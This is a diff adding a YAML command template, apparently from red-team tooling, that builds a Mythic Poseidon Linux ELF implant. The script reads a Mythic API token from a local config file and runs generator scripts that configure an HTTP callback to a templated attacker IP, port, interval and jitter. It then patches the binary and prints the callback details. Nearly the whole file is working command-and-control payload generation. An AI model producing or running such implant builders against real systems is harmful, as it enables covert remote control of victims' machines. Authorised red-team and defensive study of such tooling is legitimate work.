@@ -1,0 +1,39 @@
+---
+metadata:
+  filename: "generate-mythic-poseidon-http-elf.yaml"
+  tags: ["linux", "c2"]
+  created: "2026-05-31"
+  authors: ["@TIVKU"]
+
+content: |
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '              Mythic Poseidon ELF Generator                     ' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' 'Mythic generates the ELF binary. Please wait...' && \
+  command -v patchelf > /dev/null 2>&1 || printf '%s\n' 'ERROR: patchelf not found' ; \
+  command -v patchelf > /dev/null 2>&1 && \
+  grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp && \
+  {{ python_path }} {{ templates_dir }}/helper_scripts/mythicConfigGenerator.py \
+    --payload-type poseidon \
+    --callback-host http://{{ attacker_ip }} \
+    --callback-port {{ mythic_callback_port }} \
+    --callback-interval {{ mythic_callback_interval }} \
+    --callback-jitter {{ mythic_callback_jitter }} \
+    --selected-os Linux \
+    --output-type exe \
+    --killdate {{ mythic_killdate }} \
+    --commands {{ mythic_payload_commands }} | \
+  {{ python_path }} {{ templates_dir }}/helper_scripts/mythicPayloadGenerator.py \
+    --mythic-url {{ mythic_url }} \
+    --api-token-file /tmp/mythic_token_tmp \
+    --stdin \
+    --output packstation/outbound/poseidon && \
+  rm -f /tmp/mythic_token_tmp && \
+  {{ python_path }} {{ templates_dir }}/helper_scripts/patch_elf_glibc_compat.py packstation/outbound/poseidon && \
+  patchelf --add-needed libpthread.so.0 packstation/outbound/poseidon && \
+  patchelf --add-needed libdl.so.2 packstation/outbound/poseidon && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                    Poseidon ELF Ready                          ' && \
+  printf '%s\n' 'Callback: http://{{ attacker_ip }}:{{ mythic_callback_port }}' && \
+  printf '%s\n' 'Interval: {{ mythic_callback_interval }}s (jitter: {{ mythic_callback_jitter }}%)' && \
+  printf '%s\n' '================================================================'
